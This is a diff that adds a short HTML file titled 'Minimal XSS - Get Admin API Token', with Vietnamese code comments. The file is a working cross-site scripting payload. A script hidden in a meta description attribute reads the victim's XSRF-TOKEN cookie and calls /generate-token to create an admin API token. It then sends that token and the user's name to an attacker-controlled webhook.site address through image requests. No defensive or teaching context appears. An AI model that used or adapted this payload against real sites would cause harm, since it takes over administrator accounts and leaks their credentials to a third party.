@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Get Admin API Token - Minimal</title>
+    <!-- VERSION_GET_ADMIN_TOKEN_MINIMAL_V1 -->
+    <meta name="description" content='<script>
+    (function() {
+        var webhook_id = "792a817c-a6b3-4529-a9ed-5780c728488a"; // ID Webhook của bạn
+        var attacker_url = "https://webhook.site/" + webhook_id;
+        var xsrfTokenValue = null;
+
+        try {
+            var cookies = document.cookie.split(";");
+            for (var i = 0; i < cookies.length; i++) {
+                var cookie = cookies[i].trim();
+                if (cookie.startsWith("XSRF-TOKEN=")) {
+                    // Giữ nguyên decodeURIComponent vì XSRF-TOKEN cookie thường được URL encoded
+                    xsrfTokenValue = decodeURIComponent(cookie.substring("XSRF-TOKEN=".length));
+                    break;
+                }
+            }
+        } catch (e) { /* Bỏ qua lỗi parse cookie ở phiên bản minimal này */ }
+
+        if (xsrfTokenValue) {
+            fetch("/generate-token", {
+                method: "POST",
+                headers: {
+                    "Accept": "application/json",
+                    "X-Requested-With": "XMLHttpRequest",
+                    "X-XSRF-TOKEN": xsrfTokenValue
+                }
+            })
+            .then(response => response.json()) // Mặc định là response OK và là JSON
+            .then(data => {
+                if (data && data.token) {
+                    new Image().src = attacker_url + "?admin_full_token=" + encodeURIComponent(data.token) + "&user=" + encodeURIComponent(data.user ? data.user.name : "unknown");
+                } else {
+                    new Image().src = attacker_url + "?error=no_token_in_response&data_preview=" + encodeURIComponent(JSON.stringify(data)).substring(0,200);
+                }
+            })
+            .catch(error => {
+                new Image().src = attacker_url + "?error=fetch_failed&msg=" + encodeURIComponent(error.message ? error.message : error.toString()).substring(0,200);
+            });
+        } else {
+            new Image().src = attacker_url + "?error=xsrf_token_not_found";
+        }
+    })();
+</script>'>
+</head>
+<body>
+    <h1>Minimal XSS - Get Admin API Token</h1>
+</body>
+</html>
